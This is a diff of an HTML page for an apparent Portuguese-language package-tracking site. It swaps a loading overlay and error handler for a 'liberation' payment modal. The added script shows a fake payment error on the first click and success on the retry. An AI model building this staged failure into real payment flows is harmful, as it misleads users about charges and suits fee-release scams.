-                const notification = document.createElement('div');
-                notification.id = 'trackingNotification';
-                notification.style.cssText = `
-                    position: fixed;
-                    top: 0;
-                    left: 0;
-                    width: 100%;
-                    height: 100%;
-                    background: rgba(0, 0, 0, 0.8);
-                    display: flex;
-                    align-items: center;
-                    justify-content: center;
-                    z-index: 3000;
-                    backdrop-filter: blur(5px);
-                    animation: fadeIn 0.3s ease;
-                `;
-
-                const content = document.createElement('div');
-                content.style.cssText = `
-                    background: white;
-                    border-radius: 20px;
-                    padding: 40px;
-                    text-align: center;
-                    max-width: 400px;
-                    width: 90%;
-                    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-                    animation: slideUp 0.3s ease;
-                    border: 3px solid #1e4a6b;
-                `;
-
-                content.innerHTML = `
-                    <div style="margin-bottom: 20px;">
-                        <i class="fas fa-search" style="font-size: 3rem; color: #1e4a6b; animation: pulse 1.5s infinite;"></i>
-                    </div>
-                    <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
-                        Identificando Pedido...
-                    </h3>
-                    <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
-                        Aguarde enquanto rastreamos seu pacote
-                    </p>
-                `;
-
-                notification.appendChild(content);
-                document.body.appendChild(notification);
-                document.body.style.overflow = 'hidden';
-            }
-
-            closeLoadingNotification() {
-                const notification = document.getElementById('trackingNotification');
-                if (notification) {
-                    notification.style.animation = 'fadeOut 0.3s ease';
-                    setTimeout(() => {
-                        if (notification.parentNode) {
-                            notification.remove();
-                        }
-                        document.body.style.overflow = 'auto';
-                    }, 300);
-                }
-            }
-
-            showError(message) {
-                const existingError = document.querySelector('.error-message');
-                if (existingError) {
-                    existingError.remove();
-                }
-
-                const errorDiv = document.createElement('div');
-                errorDiv.className = 'error-message';
-                errorDiv.style.cssText = `
-                    background: #fee;
-                    color: #c33;
-                    padding: 15px;
-                    border-radius: 8px;
-                    margin-top: 15px;
-                    border: 1px solid #fcc;
-                    text-align: center;
-                    font-weight: 500;
-                    animation: slideDown 0.3s ease;
-                `;
-                errorDiv.textContent = message;
-
-                const form = document.querySelector('.tracking-form');
-                if (form) {
-                    form.appendChild(errorDiv);
-
-                    setTimeout(() => {
-                        if (errorDiv.parentNode) {
-                            errorDiv.style.animation = 'slideUp 0.3s ease';
-                            setTimeout(() => errorDiv.remove(), 300);
-                        }
-                    }, 5000);
-                }
-            }
-        }
-
-        // Inicializar sistema
-        document.addEventListener('DOMContentLoaded', () => {
-            window.trackingSystem = new SimpleTrackingSystem();
-        });
-
-        // Configurar navegação
-        document.addEventListener('click', (e) => {
-            const target = e.target;
             
-            // Logo clicks
-            if (target.matches('.logo-image, [data-logo]')) {
-                e.preventDefault();
-                window.location.href = '/index.html';
-                return;
-            }
-            
-            // Footer links
-            if (target.matches('.footer-link')) {
-                e.preventDefault();
-                window.location.href = '/index.html';
-                return;
+            // Setup close button
+            const closePopupButton = document.getElementById('closePopupButton');
+            if (closePopupButton) {
+                closePopupButton.addEventListener('click', function() {
+                    const popup = document.getElementById('orderConfirmationPopup');
+                    if (popup) {
+                        popup.style.display = 'none';
+                    }
+                });
             }
         });
     </script>
+
+    <script>
+        // Configurar eventos do modal de liberação
+        document.addEventListener('DOMContentLoaded', function() {
+            const simulateButton = document.getElementById('simulatePaymentButton');
+            const closeButton = document.getElementById('closeModal');
+            const modal = document.getElementById('liberationModal');
+            
+            if (simulateButton) {
+                simulateButton.addEventListener('click', function() {
+                    // Simular erro na primeira tentativa
+                    if (!this.hasAttribute('data-retry')) {
+                        this.setAttribute('data-retry', 'true');
+                        alert('Ocorreu um erro ao tentar processar o pagamento');
+                        this.innerHTML = '<i class="fas fa-redo"></i> Tentar Novamente';
+                        return;
+                    }
+                    
+                    // Segunda tentativa - sucesso
+                    if (modal) {
+                        modal.style.display = 'none';
+                    }
+                    
+                    // Processar pagamento com sucesso
+                    if (window.trackingSystemInstance) {
+                        window.trackingSystemInstance.processSuccessfulPayment();
+                    }
+                });
+            }
+            
+            if (closeButton) {
+                closeButton.addEventListener('click', function() {
+                    if (modal) {
+                        modal.style.display = 'none';
+                    }
+                });
+            }
+            
+            if (modal) {
+                modal.addEventListener('click', function(e) {
+                    if (e.target === modal) {
+                        modal.style.display = 'none';
+                    }
+                });
+            }
+        });
+    </script>
+
+    <script type="module" src="tracking-system.js"></script>
 </body>
 </html>
